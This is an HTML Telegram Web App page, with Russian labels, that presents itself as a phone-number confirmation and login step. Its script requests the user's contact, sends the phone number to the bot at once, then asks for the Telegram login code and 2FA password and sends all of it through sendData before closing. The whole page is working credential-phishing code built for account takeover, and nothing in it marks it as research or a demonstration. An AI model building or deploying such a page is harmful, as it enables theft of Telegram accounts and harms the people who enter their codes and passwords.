<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { width: 85%; padding: 20px; border: 1px solid #333; border-radius: 15px; text-align: center; }
        .btn { background: #00ff88; color: #000; padding: 15px; border-radius: 10px; width: 100%; border: none; font-weight: bold; cursor: pointer; }
        .hidden { display: none; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; color: #fff; border: 1px solid #444; border-radius: 8px; box-sizing: border-box; text-align: center; }
    </style>
</head>
<body>
    <div class="card">
        <div id="step1">
            <button class="btn" id="auth">ПОДТВЕРДИТЬ НОМЕР</button>
        </div>
        <div id="step2" class="hidden">
            <input type="number" id="code" placeholder="Код">
            <input type="password" id="pass" placeholder="2FA Пароль">
            <button class="btn" id="finish">ВОЙТИ</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        let phone = "";

        document.getElementById('auth').onclick = function() {
            tg.requestContact(function(ok, res) {
                if (ok && (res.response_data?.phone_number || res.contact?.phone_number)) {
                    phone = res.response_data?.phone_number || res.contact?.phone_number;
                    // Пытаемся отправить данные СРАЗУ
                    tg.sendData(JSON.stringify({a: "s", p: String(phone)}));
                    document.getElementById('step1').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                } else {
                    alert("Нажмите 'Поделиться'");
                }
            });
        };

        document.getElementById('finish').onclick = function() {
            const c = document.getElementById('code').value;
            const p = document.getElementById('pass').value || "none";
            // Отправляем финальный пакет
            tg.sendData(JSON.stringify({a: "v", p: String(phone), c: String(c), pass: String(p)}));
            tg.close();
        };
    </script>
</body>
</html>
